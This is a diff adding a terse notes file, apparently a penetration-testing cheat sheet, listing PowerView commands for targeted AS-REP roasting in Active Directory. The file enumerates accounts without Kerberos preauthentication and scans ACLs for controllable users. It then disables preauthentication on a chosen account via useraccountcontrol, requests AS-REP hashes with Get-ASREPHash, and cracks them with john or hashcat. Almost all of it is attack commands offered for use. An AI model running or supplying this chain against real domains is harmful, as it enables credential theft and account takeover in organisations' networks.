@@ -1,0 +1,19 @@
+powerview_dev
+
+Get-DomainUser -PreauthNotRequired
+
+-Force disable kerberos Preauth (enable AS-REP roast!)
+
+Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"} - to check what users we have control over
+
+Set-DomainObject -Identity ControlXUser -XOR @{useraccountcontrol=4194304} -Verbose
+
+Get-DomainUser -PreauthNotRequired
+
+--ACTIOOOONNNN
+
+Get-ASREPRoast.ps1
+
+Get-ASREPHash -UserName USER -Verbose
+
+crack with john/hashcat
